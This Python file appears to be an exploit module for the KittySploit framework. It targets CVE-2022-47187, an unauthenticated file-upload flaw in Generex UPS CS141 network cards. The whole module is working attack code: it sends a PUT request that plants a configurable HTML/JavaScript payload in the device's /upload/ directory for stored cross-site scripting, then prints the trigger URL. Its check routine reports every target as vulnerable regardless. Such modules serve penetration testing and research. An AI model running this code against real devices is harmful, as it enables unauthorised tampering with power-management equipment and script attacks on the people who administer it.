from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.cs141 import CS141


class Module(Auxiliary, Http_client, CS141):
    __info__ = {
        "name": "Generex CS141 CVE-2022-47187 - XSS via File Upload",
        "description": (
            "Generex UPS CS141 below 2.06 allows unauthenticated upload of HTML content into the "
            "upload directory, enabling stored XSS when a victim opens the uploaded file."
        ),
        "author": ["JoelGMSec", "KittySploit Team"],
        "cve": "CVE-2022-47187",
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2022-47187",
            "https://www.incibe-cert.es/en/early-warning/ics-advisories/update-03032023-multiple-vulnerabilities-generex-ups-cs141",
        ],
        "tags": ["cs141", "xss", "upload", "unauthenticated"],
    }

    remote_name = OptString("index.html", "Filename to place in the upload directory", required=True)
    xss_payload = OptString("<script>alert('XSS')</script>", "HTML/JS payload to upload", required=True)

    def check(self):
        return {
            "vulnerable": True,
            "reason": "CVE-2022-47187 depends on successfully placing an HTML file in /upload/.",
            "confidence": "low",
        }

    def run(self):
        upload_path = self.cs141_join_path(self.cs141_normalize_base_path(self.path), "upload", self.remote_name)
        response = self.http_request(
            method="PUT",
            path=upload_path,
            headers=self.cs141_unauth_upload_headers("text/html"),
            data=self.xss_payload,
            timeout=20,
        )

        if response and response.status_code in (201, 204):
            print_success(f"HTML payload uploaded to {upload_path}")
            print_info(f"Trigger URL: {upload_path}")
            return True

        print_error(f"XSS upload failed with HTTP {getattr(response, 'status_code', 'no-response')}")
        return False
